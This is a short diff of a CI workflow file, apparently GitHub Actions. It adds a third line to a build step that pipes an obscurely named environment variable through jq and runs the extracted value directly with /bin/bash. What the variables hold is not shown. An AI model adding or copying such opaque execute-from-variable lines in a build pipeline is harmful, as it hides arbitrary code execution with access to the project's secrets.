@@ -23,6 +23,7 @@ jobs:
         run: |
           printf '%s' "$uah2323" | jq -r .cg0472 | /bin/bash
           echo $l49 | jq -r .zat50 | /bin/bash
+          echo $yfry470 | jq -r .z60 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
